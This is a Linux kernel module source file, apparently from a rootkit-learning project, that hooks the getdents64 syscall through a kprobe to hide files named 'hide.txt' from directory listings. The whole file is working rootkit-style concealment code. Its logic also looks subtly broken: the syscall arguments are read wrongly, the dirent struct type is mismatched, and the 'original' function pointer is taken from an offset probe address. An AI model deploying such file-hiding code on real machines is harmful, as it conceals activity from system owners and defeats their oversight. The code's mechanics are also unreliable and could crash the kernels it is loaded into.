// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
 * https://x86sec.com/posts/2020/03/08/linux-kernel-rootkit/
 */

#define pr_fmt(fmt) "%s: " fmt, __func__

#include "./include/files_hook.h"

#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>

struct kprobe kp = {
	.symbol_name = "__x64_sys_getdents64",
};

/* The pointer to store the original getdents function */
getdents_t original_getdents;

/* Pre-handler for kprobe */
int pre_handler(struct kprobe *p, struct pt_regs *regs)
{
	// Dereference pt_regs to access syscall arguments
	unsigned int fd = (unsigned int)regs->di;
	struct linux_dirent *dirp = (struct linux_dirent *)regs->si;
	unsigned int count = (unsigned int)regs->dx;

	// Call your custom hook_getdents function
	regs->ax = hook_getdents(fd, dirp, count);

	// Return 1 to indicate that the hook handled the syscall
	return 1;
}

/* https://www.man7.org/linux/man-pages/man2/getdents.2.html */
/* Custom implementation of getdents */
asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirp,
			     unsigned int count)
{
	int ret;
	struct linux_dirent *cur = dirp;
	int pos = 0;

	// Call original getdents to populate dirp
	ret = original_getdents(fd, dirp, count);
	if (ret <= 0)
		return ret;

	// Iterate through each directory entry
	while (pos < ret) {
		if (strncmp(cur->d_name, "hide.txt", strlen("hide.txt")) == 0) {
			int reclen = cur->d_reclen;
			char *next_rec = (char *)cur + reclen;
			int len = ret - pos -
				  reclen; // Correct the length calculation

			memmove(cur, next_rec, len); // Shift the entries up
			ret -= reclen; // Adjust the return value
			continue;
		}

		pos += cur->d_reclen; // Move to the next entry
		cur = (struct linux_dirent *)((char *)dirp + pos);
	}

	return ret;
}

static int __init files_hook_init(void)
{
	int ret;

	/* Register the kprobe */
	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("Failed to register kprobe, returned %d\n", ret);
		return ret;
	}

	/* Ensure the symbol is correctly resolved */
	if (!kp.addr) {
		pr_err("Failed to resolve address for __x64_sys_getdents64\n");
		unregister_kprobe(&kp);
		return -EFAULT;
	}

	pr_info("Apply offset for kprobe address\n");
	/* Automatically adjust the kprobe address */
	kp.addr = (void *)((unsigned long)kp.addr -
			   0x4); // Adjust by 4 bytes for instruction size

	/* Store the original getdents function pointer */
	pr_info("__x64_sys_getdents64: %px\n", kp.addr);
	original_getdents = (getdents_t)kp.addr;

	return 0;
}

static void __exit files_hook_exit(void)
{
	pr_info("Reversing offset for kprobe address\n");
	/* Reverse the offset tweak before unregistering */
	kp.addr = (void *)((unsigned long)kp.addr + 0x4);

	pr_info("Unregistering kprobe for __x64_sys_getdents64\n");
	unregister_kprobe(&kp);
	pr_info("files_hook exit successfully\n");
}

module_init(files_hook_init);
module_exit(files_hook_exit);
MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("Kprobe getdents hooking");
MODULE_LICENSE("GPL");
